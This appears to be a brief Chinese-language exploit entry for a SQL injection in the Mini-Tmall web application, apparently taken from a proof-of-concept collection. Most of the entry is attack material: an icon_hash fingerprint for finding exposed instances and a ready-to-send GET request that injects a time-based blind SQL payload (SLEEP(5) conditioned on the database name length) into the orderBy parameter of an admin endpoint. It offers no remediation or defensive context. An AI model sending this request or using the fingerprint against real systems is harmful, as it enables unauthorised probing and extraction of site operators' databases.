# Mini-TmallSQL注入漏洞

Mini ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="-2087517259"`
- **请求**：`GET /tmall/admin/user/1/1?orderBy=7,if((length(database())=11),SLEEP(5),0) HTTP/1.1`
- **响应特征**：200